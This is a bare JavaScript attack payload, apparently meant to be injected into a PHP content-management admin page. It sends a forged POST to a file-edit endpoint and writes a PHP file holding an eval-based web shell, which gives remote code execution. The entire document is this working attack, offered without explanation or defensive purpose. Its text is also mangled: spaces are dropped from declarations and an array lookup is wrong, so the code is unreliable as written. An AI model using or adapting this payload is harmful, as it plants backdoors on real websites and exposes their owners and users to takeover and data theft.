varrequest = false;
if (window.XMLHttpRequest) {
    request = newXMLHttpRequest();
    if (request.overrideMimeType) {
        request.overrideMimeType('text/xml');
    }
}
else if(window.ActiveXObject) {
    varversions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];
    for (vari = 0; i < versions.length; i++) {
        try {
            request = newActiveXObject(versions);
        } catch (e) {}
    }
}
xmlhttp = request;
function getFolder(url) {
    obj = url.split('/');
    return obj[obj.length - 2];
}
oUrl = top.location.href;
u = getFolder(oUrl);
add_admin();
function add_admin() {
    varurl = "/" + u + "/sys_sql_query.php";
    varparams = "fmdo=edit&backurl=&activepath=%2Fdata&filename=123.php&str=<%3Fphp+eval%28%24_POST%5Br123%5D%29%3F>&B1=++%E4%BF%9D+%E5%AD%98++";
    xmlhttp.open("POST", url, true);
    xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xmlhttp.setRequestHeader("Content-length", varparams.length);
    xmlhttp.setRequestHeader("Connection", "Keep-Alive");
    xmlhttp.send(varparams);
}